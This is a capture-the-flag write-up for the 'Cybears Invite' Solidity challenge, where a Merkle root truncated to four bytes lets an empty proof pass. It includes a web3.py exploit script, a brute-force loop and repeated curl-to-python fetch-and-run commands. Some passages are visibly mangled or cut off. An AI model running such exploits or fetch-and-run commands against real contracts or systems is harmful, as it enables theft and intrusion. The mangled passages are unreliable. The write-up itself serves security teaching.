---
title: "CybearsInvite - CTF Writeup"
date: 2025-12-27
draft: false
description: "Blockchain challenge writeup"
tags: ["Blockchain", "Easy"]
categories: ["Writeups"]
---

**Challenge Name:** Cybears Invite  
**Category:** Blockchain  
**CTF:** ClawTheFlag  
**Difficulty:** Medium
**Description:** *Can you get your ticket to enter the finals?*  
**Connection:** `nc 13.61.1.167 31337`  

---

## TL;DR (Quick Solution)

The challenge uses a Merkle tree verification system with a critical flaw: the Merkle root is truncated to only 4 bytes (`bytes4`) instead of the standard 32 bytes (`bytes32`). This reduces the security from 256 bits to just 32 bits.

**The exploit:**
1. The Merkle root is `0xa9059cbb` (only 4 bytes)
2. This value equals `bytes4(keccak256("transfer(address,uint256)"))` - the ERC-20 transfer function selector
3. With an empty proof array, the contract checks if `bytes4(keccak256(secret)) == merkleRoot`
4. Using secret `"transfer(address,uint256)"` passes the check and mints the NFT
5. Once minted, retrieve the flag using your instance UUID

**Flag:** `cybears{4lwAyS_cH3Ck_4RRay_lEnGtHS}` ("Always check array lengths" - a hint about the truncation vulnerability!)

---

## Challenge Overview

This is a smart contract security challenge where you need to mint a "Cybears Finals Invitation" NFT by bypassing a Merkle proof verification system. 

**What you get:**
- A netcat endpoint that launches a private Ethereum blockchain instance
- Source code for several Solidity contracts
- A funded Ethereum account to interact with the contracts

**Your goal:** 
- Mint an invitation NFT from the `CybearsInvite` contract
- Make `Setup.isSolved()` return `true`
- Retrieve the flag

**Files provided:**
- `CybearsInvite.sol` — Main contract with NFT minting logic and Merkle verification
- `ERC721.sol` — Minimal ERC-721 NFT implementation
- `MerkleProof.sol` — Custom (buggy) Merkle proof verification library
- `Setup.sol` — Deployment contract that checks if challenge is solved

---

## Understanding Merkle Trees (Background)

Before diving into the vulnerability, let's understand what Merkle trees are and why they're used:

**What's a Merkle Tree?**
- A data structure that allows efficient verification of whether an element is part of a set
- Used in allowlists/whitelists to verify if an address is permitted to mint NFTs
- Instead of storing thousands of addresses on-chain (expensive!), you store just one 32-byte "root" hash

**How it normally works:**
1. Build a tree of hashes off-chain from your allowlist
2. Store only the root hash on-chain
3. Users submit a "proof" (array of hashes) along with their data
4. Contract verifies the proof against the root - if valid, they're on the allowlist

**Standard security:** Merkle roots are `bytes32` (32 bytes = 256 bits), making collisions computationally infeasible (2^256 possibilities).

---

## The Contracts Explained

1. **Setup.sol (The Challenge Checker)**

```solidity
contract Setup {
    address public immutable PLAYER_ADR;
    CybearsInvite public immutable cyb;
    
    constructor(address _playerAdr, bytes32 merkleRoot) {
        PLAYER_ADR = _playerAdr;
        cyb = new CybearsInvite(merkleRoot);
    }
    
    function isSolved() external view returns (bool) {
        return cyb.balanceOf(PLAYER_ADR) > 0;
    }
}
```
2. **CybearsInvite.sol (The Vulnerable Contract)**

```solidity
contract CybearsInvite is ERC721 {
    bytes4 private _merkleRoot;  // ⚠️ ONLY 4 BYTES! Should be bytes32!
    uint public lastTokenId;
    mapping(string => bool) private _minted;

    constructor(bytes32 _root) ERC721("Cybears Finals Invitation", "CybFInv") {
        _merkleRoot = bytes4(_root);  // ⚠️ Truncates 32 bytes to 4 bytes!
    }

    function mintInvite(bytes32[] calldata _proof, string memory secret) public {
        require(!hasMinted(secret), "Already minted");
        require(
          MerkleProof.verify(
            _proof,
            _merkleRoot,
            bytes4(keccak256(abi.encodePacked(secret)))  // ⚠️ Also truncated to 4 bytes
          ),
          "Invalid proof, are you sure you are invited?"
        );
        _minted[secret] = true;
        ++lastTokenId;
        _mint(msg.sender, lastTokenId);
    }
    
    function hasMinted(string memory secret) public view returns (bool) {
        return _minted[secret];
    }
}
```

**The Critical Vulnerability:**
- `_merkleRoot` is declared as `bytes4` (4 bytes = 32 bits) instead of `bytes32` (32 bytes = 256 bits)
- In the constructor, the 32-byte input is truncated: `bytes4(_root)` takes only the first 4 bytes
- This reduces security from 2^256 possibilities (impossible to brute force) to 2^32 possibilities (4.3 billion - potentially brute-forceable!)

**How the verification works:**
1. User submits a `_proof` array and a `secret` string
2. Contract computes `bytes4(keccak256(secret))` - the first 4 bytes of the secret's hash
3. `MerkleProof.verify()` checks if this matches the Merkle root
4. If the proof is empty and the hash matches,


``` bash
verification passes!
        _minted[secret] = true;
        ++lastTokenId;
        _mint(msg.sender, lastTokenId);
    }
}
```
- The Merkle root is stored as `bytes4`, i.e., only the first 4 bytes of a 32‑byte root are kept. That cuts entropy from 256 bits to 32 bits.
- Verification compares `bytes4(keccak256(secret))` (if proof is empty, the value remains the initial `bytes4`) with `_merkleRoot`.

### MerkleProof.sol (buggy assembly — not needed for the exploit)
```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.22;
library MerkleProof {
    function verify(bytes32[] calldata proof, bytes4 root, bytes4 secret) internal pure returns (bool) {
        require(root != bytes32(0), "MerkleProof: Root cannot be zero");
        require(secret != bytes32(0), "MerkleProof: Leaf cannot be zero");
        assembly {
            let bytes_mask := 0xffffffff00000000000000000000000000000000000000000000000000000000
            let proof_elements_ptr := add(proof.offset, 0x20)
            for { let i := 0 } lt(i, proof.length) { i := add(i, 1) }
            {
                let proofElement := calldataload(add(proof_elements_ptr, mul(i, 0x20)))
                if lt(secret, proofElement) {
                    mstore(0x80, secret)
                    mstore(0xa0, proofElement)
                }
                {
                    mstore(0x80, proofElement)
                    mstore(0xa0, secret)
                }
                let newHash := keccak256(0x80, 64)
                secret := and(newHash, bytes_mask)
            }
        }
        return secret == root;
    }
}
```
> ***Finding the Vulnerability***

Let's trace through what happens when we call `mintInvite`:

1. **Contract receives:** `_proof` array and `secret` string
2. **Computes:** `leaf = bytes4(keccak256(abi.encodePacked(secret)))`
3. **Calls:** `MerkleProof.verify(_proof, _merkleRoot, leaf)`
4. **If `_proof` is empty:** Loop doesn't execute, returns `leaf == _merkleRoot`
5. **If check passes:** Mint NFT ✅

**The Attack Surface:**
- We need `bytes4(keccak256(secret))` to equal the stored `_merkleRoot`
- The root is only 4 bytes, not 32 bytes
- We need to find what the root value is and find a matching secret

---

## The Solution

### Discovery Process

**Step 1: What is the Merkle root?**

When we get an instance, the `Setup` contract is deployed with a specific `merkleRoot` value. We can find this by:
- Reading the contract creation transaction
- Examining contract storage

**Step 2: Launch Your Instance**

Connect to the challenge server and solve the Proof of Work (PoW):

```bash
nc 13.61.1.167 31337
```

You'll see a menu:
```
1 - launch new instance
2 - kill instance
3 - get flag (if isSolved() is true)
action?
```

Type `1` and press Enter. You'll get a PoW challenge:

```
== PoW ==
  sha256("9604ed1193e3ed5e" + YOUR_INPUT) must start with 24 zeros in binary representation
  please run the following command to solve it:
    python3 <(curl -sSL https://minaminao.github.io/tools/solve-pow.py) 9604ed1193e3ed5e 24

  YOUR_INPUT = 
```

**Solve the PoW:**
Open a new terminal and run the suggested command:
```bash
python3 <(curl -sSL https://minaminao.github.io/tools/solve-pow.py) 9604ed1193e3ed5e 24
```
**Step 3: Verify the Secret**

Let's confirm that `"transfer(address,uint256)"` produces the correct hash:

```python
from web3 import Web3

w3 = Web3()
secret = "transfer(address,uint256)"
hash_result = w3.keccak(text=secret)

print(f"Secret: {secret}")
print(f"Full hash: {hash_result.hex()}")
print(f"First 4 bytes (bytes4): {hash_result[:4].hex()}")
```

Output:
```
Secret: transfer(address,uint256)
Full hash: 0xa9059cbb2ab09eb219583f4a59a5d0623ade346d962bcd4e46b11da047c9049b
First 4 bytes (bytes4): a9059cbb
```

Perfect! This matches the function selector for ERC-20 `transfer`.s will pass the Merkle verification and mint us an NFT!

---

## Exploitation

with an empty proof (`proof.length == 0`), the loop never runs, and the verifier returns `bytes4(keccak256(secret)) == root`. That’s enough for us.

---

### Attack Strategy
1. Launch a new instance via the netcat launcher and solve the Proof of Work (PoW).
2. Extract the `merkleRoot` value used in your instance:
   - From the Setup constructor calldata (cleanest), or
   - By inspecting storage (less reliable due to inheritance layout), or
   - By spotting that the root equals `0xa9059cbb` (ERC‑20 `transfer` selector) as a deliberate hint.
3. Realize that `0xa9059cbb == bytes4(keccak256("transfer(address,uint256)"))`.
4. Call `mintInvite` with an empty proof `[]` and the secret string `"transfer(address,uint256)"`.
5. Verify `isSolved()` and request the flag with your instance UUID.

---

### Step‑By‑Step Exploitation

1) Launch instance and solve PoW
Use netcat and the provided PoW solver.

```bash
# Connect to the launcher
nc 13.61.1.167 31337

# When prompted, run the recommended PoW solver locally
python3 <(curl -sSL https://minaminao.github.io/tools/solve-pow.py) <CHALLENGE_HEX> 24

# Provide the solver's YOUR_INPUT back to nc when asked
```
On success, the server prints:
- `uuid`: your instance id
- `rpc endpoint`: your per‑instance RPC URL
- `private key` and `your address`: funded account
- `challenge contract`: the deployed `Setup` address

Example output (yours will differ):
```
uuid:               ecc11475-e31c-4e6e-892d-c2f5b545c4c4
rpc endpoint:       http://13.61.1.167:8545/ecc11475-e31c-4e6e-892d-c2f5b545c4c4
private key:        0xc5c0...e6f
your address:       0x3F08...d87D
challenge contract: 0x359A...1bFA
```

2) Derive the Merkle root used
There are multiple ways; the most faithful is decoding the Setup deployment transaction input to get the constructor args: `(playerAddress, merkleRoot)`.

Minimal Python (Web3) snippet to locate the Setup creation in recent blocks and read its input:
```python
from web3 import Web3
w3 = Web3(Web3.HTTPProvider('<RPC_ENDPOINT>'))
setup_addr = '<SETUP_ADDRESS>'
```
3) Write the Exploit Script

Create a Python script to mint the NFT (save as `mint_nft.py`):

```python
#!/usr/bin/env python3
from web3 import Web3
import sys

# Replace with YOUR instance credentials from Step 1
RPC_URL = "http://13.61.1.167:8545/ecc11475-e31c-4e6e-892d-c2f5b545c4c4"
PRIVATE_KEY = "0xc5c0833a3181817c06130dd1405b01c06261d56da5bae076ad38a3b5eaa82e6f"
YOUR_ADDRESS = "0x3F0837A0332E10E8F371783a9798088b915Ad87D"
CHALLENGE_CONTRACT = "0x359A9678405C7923B246821DD5ded1f59d371bFA"

# Connect to the blockchain
w3 = Web3(Web3.HTTPProvider(RPC_URL))
print("✓ Connected to blockchain\n")

# The secret that matches 0xa9059cbb!
secret = "transfer(address,uint256)"
print(f"Secret: '{secret}'")
print(f"Hash (first 4 bytes): {w3.keccak(text=secret)[:4].hex()}\n")

# Contract ABIs (minimal - just what we need)
setup_abi = [
    {"inputs":[],"name":"cyb","outputs":[{"internalType":"contract CybearsInvite","name":"","type":"address"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"isSolved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}
]

invite_abi = [
    {"inputs":[
        {"internalType":"bytes32[]","name":"_proof","type":"bytes32[]"},
        {"internalType":"string","name":"secret","type":"string"}
    ],"name":"mintInvite","outputs":[],"stateMutability":"nonpayable","type":"function"}
]

# Get contract instances
setup = w3.eth.contract(address=CHALLENGE_CONTRACT, abi=setup_abi)
cyb_address = setup.functions.cyb().call()
invite = w3.eth.contract(address=cyb_address, abi=invite_abi)

print(f"Setup contract: {CHALLENGE_CONTRACT}")
print(f"CybearsInvite contract: {cyb_address}")
print("\nMinting NFT...\n")

# Build and send the mint transaction
nonce = w3.eth.get_transaction_count(YOUR_ADDRESS)

txn = invite.functions.mintInvite(
    [],  # Empty proof array
    secret  # The magic string
).build_transaction({
    'from': YOUR_ADDRESS,
    'nonce': nonce,
    'gas': 500000,
    'gasPrice': w3.eth.gas_price
})

# Sign and send
signed = w3.eth.account.sign_transaction(txn, PRIVATE_KEY)
tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
print(f"Transaction sent: {tx_hash.hex()}")
print("Waiting for confirmation...")

# Wait for the transaction to be mined
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
```
4) Get the Flag

Now that `isSolved()` returns `true`, go back to the netcat session (or start a new one):

```bash
nc 13.61.1.167 31337
```

Select option `3`:
```
1 - launch new instance
2 - kill instance
3 - get flag (if isSolved() is true)
action? 3
```
## Technical Deep Dive

### Why Does This Work?

Let's trace through the execution:

1. **We call:** `mintInvite([], "transfer(address,uint256)")`

2. **Contract computes:**
   ```solidity
   bytes4 leaf = bytes4(keccak256(abi.encodePacked("transfer(address,uint256)")))
   // Result: 0xa9059cbb
   ```

3. **Verification called:**
   ```solidity
   MerkleProof.verify(
       [],           // Empty proof
       0xa9059cbb,   // Stored _merkleRoot (truncated from constructor)
       0xa9059cbb    // Our computed leaf
   )
   ```

4. **Inside MerkleProof.verify:**
   - The for loop condition `lt(i, proof.length)` is `lt(0, 0)` = false
   - Loop body never executes
   - Function returns `secret == root` → `0xa9059cbb == 0xa9059cbb` → `true` ✓

5. **Verification passes!** NFT is minted.

## The Security Flaw

**Normal Merkle trees:**
- Use `bytes32` (32 bytes = 256 bits)
- 2^256 possible values ≈ 1.16 × 10^77
- Computationally impossible to find collisions

**This challenge:**
- Uses `bytes4` (4 bytes = 32 bits)
- 2^32 possible values = 4,294,967,296
- Finding collisions is feasible!
- In fact, you could brute-force find ANY secret that hashes to match the 4-byte root

**The hint:**
The challenge creator chose `0xa9059cbb` (the `transfer` function selector) as a big hint. It's one of the most well-known 4-byte values in Ethereum!

---

## Alternative Approaches (What Didn't Work)

### Approach 1: Brute Force
You could theoretically brute-force 4 billion possibilities:

```python
target = bytes.fromhex('a9059cbb')
for i in range(4_300_000_000):  # ~4.3 billion
    secret = str(i)
    if w3.keccak(text=secret)[:4] == target:
        print(f"Found: {secret}")
        break
```

**Problem:** This takes hours/days without GPU acceleration or optimized code. Not practical for a CTF.

### Approach 2: Storage Reading
You could read the contract's storage to find `_merkleRoot`:

```python
# CybearsInvite storage layout (including inherited ERC721)
# Slot 0-3: ERC721 mappings
# Slot 4-5: ERC721 strings (name, symbol)
# Slot 6: bytes4 _merkleRoot (packed)
storage = w3.eth.get_storage_at(cyb_address, 6)
```

**Problem:** Storage layout with inheritance is tricky. The root is also packed in a slot, making extraction non-obvious.

### Approach 3: Exploit the MerkleProof Bug
The assembly bug where the second block always executes seems exploitable...
Lessons Learned

### Key Takeaways

1. **Type matters!** `bytes4` vs `bytes32` is a massive security difference
   - `bytes4`: 32 bits = 4.3 billion possibilities (weak)
   - `bytes32`: 256 bits = 1.16 × 10^77 possibilities (cryptographically secure)

2. **Truncation is dangerous**
   - Converting `bytes32 → bytes4` loses 224 bits of entropy
   - Always use full-width types for security-critical values

3. **Know your function selectors**
   - `0xa9059cbb` is instantly recognizable to Ethereum developers
   - Common selectors can be guessed or looked up

4. **Test edge cases**
   - What happens with an empty proof array?
   - Does the verification logic handle it correctly?

5. **Use battle-tested libraries**
   - Custom assembly is error-prone (as seen in the buggy MerkleProof)
   - OpenZeppelin's libraries are audited and reliable

### How to Fix This

**Vulnerable Code:**
```solidity
bytes4 private _merkleRoot;  // ❌ Only 4 bytes!

constructor(bytes32 _root) {
    _merkleRoot = bytes4(_root);  // ❌ Truncates!
}
```

**Secure Code:**
```solidity
bytes32 private _merkleRoot;  // ✅ Full 32 bytes

constructor(bytes32 _root) {
    _merkleRoot = _root;  // ✅ No truncation
}

function mintInvite(bytes32[] calldata _proof, string memory secret) public {
    require(
        MerkleProof.verify(
            _proof,
            _merkleRoot,  // ✅ Compare full 32 bytes
            keccak256(abi.encodePacked(secret))  // ✅ Full hash
        ),
        "Invalid proof"
    );
    // ... mint logic
}
```

**Better: Use OpenZeppelin:**
```solidity
import "@openzeppelin/contracts/utils/cryptography/MerkleProof.sol";

function mintInvite(bytes32[] calldata _proof, string memory secret) public {
    bytes32 leaf = keccak256(abi.encodePacked(msg.sender, secret));
    require(
        MerkleProof.verify(_proof, _merkleRoot, leaf),
        "Invalid proof"
    );
    // ... mint logic
}
```

---

## Tools & References

### Tools Used
- **Web3.py**: Python library for interacting with Ethereum
  ```bash
  pip install web3
  ```

- **PoW Solver**: Provided by the CTF organizers
  ```bash
  python3 <(curl -sSL https://minaminao.github.io/tools/solve-pow.py) <challenge> 24
  ```

- **Netcat**: For connecting to the challenge server
  ```bash
  nc 13.61.1.167 31337
  ```

### Important Ethereum Concepts
- **Function Selectors**: First 4 bytes of `keccak256(function_signature)`
- **Merkle Trees**: Efficient data structure for proving set membership
- **bytes4 vs bytes32**: Fixed-size byte arrays in Solidity
- **ABI Encoding**: How function calls and data are encoded in Ethereum

### Common Function Selectors
```
0xa9059cbb - transfer(address,uint256)
0x23b872dd - transferFrom(address,address,uint256)
0x095ea7b3 - approve(address,uint256)
0x70a08231 - balanceOf(address)
0x18160ddd - totalSupply()
```

### Further Reading
- [OpenZeppelin MerkleProof Documentation](https://docs.openzeppelin.com/contracts/4.x/api/utils#MerkleProof)
- [Ethereum Yellow Paper - Keccak256](https://ethereum.github.io/yellowpaper/paper.pdf)
- [Solidity Types - bytes](https://docs.soliditylang.org/en/latest/types.html#fixed-size-byte-arrays)

---

### Solution Summary
```python
# The vulnerability
_merkleRoot = bytes4(_root)  # Only 4 bytes stored!

# The exploit
secret = "transfer(address,uint256)"
bytes4(keccak256(secret)) == 0xa9059cbb  # Matches!

# The attack
mintInvite([], "transfer(address,uint256)")
```

### Commands Cheat Sheet
```bash
# 1. Launch instance
nc 13.61.1.167 31337
# Choose option 1

# 2. Solve PoW
python3 <(curl -sSL https://minaminao.github.io/tools/solve-pow.py) <CHALLENGE> 24

# 3. Run exploit
python3 mint_nft.py

# 4. Get flag
nc 13.61.1.167 31337
# Choose option 3, enter UUID
```

### Flag
```
cybears{4lwAyS_cH3Ck_4RRay_lEnGtHS}
```

*"Always check array lengths" - Don't truncate your security!*

---

## Conclusion

This challenge demonstrates a critical but subtle vulnerability: **truncating cryptographic values drastically weakens security**. By storing only 4 bytes of the Merkle root instead of the standard 32 bytes, the contract reduced the search space from impossible (2^256) to feasible (2^32).

The challenge creator made it solvable by choosing `0xa9059cbb` - the well-known ERC-20 `transfer` function selector - as a hint. This turned what could have been a brute-force exercise into a clever "aha!" moment when you recognize the value.

**Key lessons:**
- Always use full-width types for security-critical values (`bytes32` not `bytes4`)
- Be extremely careful with type conversions and truncations
- Use well-audited libraries (OpenZeppelin) instead of rolling your own crypto
- Test edge cases like empty arrays
- Know your common Ethereum function selectors!

Thanks to the **Cybears** team for a fun and educational challenge! 🐻🎫

